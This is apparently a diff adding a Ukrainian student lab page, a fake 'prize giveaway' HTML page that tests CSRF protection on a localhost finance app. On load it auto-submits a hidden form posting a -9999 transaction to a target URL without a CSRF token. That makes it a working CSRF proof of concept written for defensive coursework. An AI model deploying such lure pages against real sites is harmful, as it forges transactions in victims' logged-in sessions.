@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<!--
+  Практична робота №8, варіант 13 — ТЕСТОВА сторінка «стороннього сайту» для перевірки CSRF.
+  Запуск: php -S localhost:9008 -t attack
+  Відкрити: http://localhost:9008/csrf_attack.html?target=http://localhost:8004/add.php  (практикум №4 — до)
+            http://localhost:9008/csrf_attack.html?target=http://localhost:8008/add.php  (практикум №8 — після)
+  Сторінка одразу після відкриття надсилає форму додавання транзакції від імені користувача,
+  у браузері якого відкрито застосунок. CSRF-токена зловмисник не знає, тому поле не передається.
+-->
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>Розіграш призів</title>
+</head>
+<body>
+    <h1>Вітаємо! Ви виграли приз</h1>
+    <form id="attack" method="post">
+        <input type="hidden" name="amount" value="-9999">
+        <input type="hidden" name="category" value="CSRF-атака">
+        <input type="hidden" name="transaction_date" value="2026-11-07">
+    </form>
+    <script>
+        const form = document.getElementById('attack');
+        form.action = new URLSearchParams(location.search).get('target');
+        form.submit();
+    </script>
+</body>
+</html>
